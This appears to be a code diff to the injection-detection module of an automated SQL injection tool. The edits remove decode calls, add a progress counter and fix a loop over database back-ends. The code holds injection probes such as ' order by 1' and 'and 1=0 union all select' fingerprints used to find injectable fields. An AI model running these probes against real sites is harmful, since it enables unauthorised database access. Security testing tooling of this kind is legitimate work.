@@ -59,7 +59,7 @@ class InjectionInspector:
                 print('[i] Trying injection using comment:',com)
                 mole.comment = com
                 req = mole.make_request(' order by 1')
-                if mole.analyser.node_content(req) != mole._syntax_error_content and not DbmsMole.is_error(mole.analyser.decode(req)):
+                if mole.analyser.node_content(req) != mole._syntax_error_content and not DbmsMole.is_error(req):
                     return (com, parenthesis)
         mole.parenthesis = 0
         raise Exception()
@@ -95,13 +95,16 @@ class InjectionInspector:
     def _find_injectable_field_using(self, mole, dbms_mole):
         base = 714
         fingers = dbms_mole.injectable_field_fingers(mole.query_columns, base)
+        index = 0
         for finger in fingers:
+            print('\r[+] Trying finger ' + str(index+1) + '/' + str(len(fingers)))
+            index +=1
             hashes = finger.build_query()
             to_search_hashes = finger.fingers_to_search()
             hash_string = ",".join(hashes)
-            req = mole.analyser.decode(mole.make_request(
+            req = mole.make_request(
                         " and 1=0 union all select " + hash_string + dbms_mole.field_finger_trailer()
-                  ))
+                  )
             try:
                 injectable_fields = list(map(lambda x: int(x) - base, [hash for hash in to_search_hashes if hash in req]))
                 if len(injectable_fields) > 0:
@@ -119,11 +122,11 @@ class InjectionInspector:
 
     def find_injectable_field(self, mole):
         if mole._dbms_mole is None:
-            for dbms_mole in TheMole.dbms_mole_list:
-                print('[i] Trying DBMS', mole.dbms_name())
-                field = self._find_injectable_field_using(dbms_mole)
+            for dbms_mole in mole.dbms_mole_list:
+                print('[i] Trying DBMS', dbms_mole.dbms_name())
+                field = self._find_injectable_field_using(mole, dbms_mole)
                 if not field is None:
-                    print('[+] Found DBMS:', dbms_mole.dbms_name())
+                    print('[+] Found DBMS:', dbms_mole)
                     return field
         else:
             field = self._find_injectable_field_using(mole, mole._dbms_mole.__class__)
@@ -136,6 +139,6 @@ class InjectionInspector:
             print('[i] Trying to inject in field', field + 1)
             query = dbms_mole_class.field_finger_query(mole.query_columns, finger, field)
             req = mole.make_request(query)
-            if dbms_mole_class.field_finger(finger) in mole.analyser.decode(req):
+            if dbms_mole_class.field_finger(finger) in req:
                 return field
         return None
